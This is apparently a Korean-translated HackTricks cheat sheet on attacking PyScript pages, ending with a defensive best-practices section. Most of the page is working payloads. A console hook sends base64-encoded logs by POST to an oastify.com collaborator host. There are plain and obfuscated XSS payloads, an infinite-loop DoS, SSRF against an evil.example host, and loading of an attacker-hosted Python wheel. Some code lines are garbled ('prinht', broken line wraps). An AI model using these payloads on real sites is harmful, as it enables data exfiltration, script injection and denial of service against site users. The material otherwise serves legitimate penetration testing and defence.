# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting 가이드

PyScript는 Python을 HTML에 통합하여 HTML과 함께 사용할 수 있도록 개발된 새로운 framework입니다. 이 cheat sheet에서는 penetration testing 목적으로 PyScript를 사용하는 방법을 확인할 수 있습니다.

### Emscripten 가상 메모리 파일 시스템에서 파일 Dumping / Retrieving:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
코드:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
결과:

![PyScript Pentesting Guide - Emscripten virtual memory filesystem에서 파일 Dumping / Retrieving: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console 모니터링)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
결과:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
결과:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (콘솔 모니터링) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

코드:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
결과:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

코드:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
결과:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 새로운 취약점 및 기법 (2023-2025)

### 제어되지 않은 redirect를 통한 Server-Side Request Forgery (CVE-2025-50182)

`urllib3 < 2.5.0`은 PyScript와 함께 제공되는 **Pyodide runtime 내부에서** 실행될 때 `redirect` 및 `retries` 매개변수를 무시합니다. 공격자가 대상 URL에 영향을 줄 수 있는 경우, 개발자가 redirect를 명시적으로 비활성화했더라도 Python 코드가 cross-domain redirect를 따르도록 강제할 수 있으며, 결과적으로 anti-SSRF 로직을 우회할 수 있습니다.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0`에서 패치됨 – PyScript image의 package를 업그레이드하거나 `packages = ["urllib3>=2.5.0"]`로 안전한 버전을 고정하세요. 자세한 내용은 공식 CVE 항목을 참조하세요.

### 임의 package 로딩 및 supply-chain 공격

PyScript는 `packages` 목록에서 임의의 URL을 허용하므로, 설정을 수정하거나 주입할 수 있는 악의적인 공격자는 피해자의 브라우저에서 **완전히 임의의 Python**을 실행할 수 있습니다:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*순수 Python wheels만 필요하며 WebAssembly compilation 단계는 필요하지 않습니다.* configuration이 user-controlled가 되지 않도록 하고, HTTPS 및 SRI hashes를 사용하여 trusted wheels를 자체 domain에서 호스팅하세요.

### Output sanitisation changes (2023+)

* `print()`는 여전히 raw HTML을 inject하므로 XSS에 취약합니다(위 예시 참조).
* 새로운 `display()` helper는 **기본적으로 HTML을 escape**합니다. raw markup은 `pyscript.HTML()`로 감싸야 합니다.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
이 동작은 2023년에 도입되었으며 공식 Built-ins 가이드에 문서화되어 있습니다. 신뢰할 수 없는 입력에는 `display()`를 사용하고 `print()`를 직접 호출하지 마세요.<sup>[[2]](#references)</sup>

---

## 방어 모범 사례

* **패키지를 최신 상태로 유지** – `urllib3 >= 2.5.0`으로 업그레이드하고 사이트와 함께 제공되는 wheel을 정기적으로 다시 빌드하세요.
* **패키지 소스를 제한** – PyPI 이름 또는 동일 출처 URL만 참조하고, 가능한 경우 Sub-resource Integrity (SRI)로 보호하세요.
* **Content Security Policy 강화** – 인라인 JavaScript (`script-src 'self' 'sha256-…'`)를 허용하지 않아 삽입된 `<script>` 블록이 실행되지 않도록 하세요.
* **사용자가 제공한 `<py-script>` / `<script type="py">` 태그 금지** – 다른 사용자에게 다시 반환하기 전에 서버에서 HTML을 sanitise하세요.
* **worker 격리** – worker에서 DOM에 동기적으로 접근할 필요가 없다면 `sync_main_only` flag를 활성화하여 `SharedArrayBuffer` header 요구 사항을 피하세요.

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
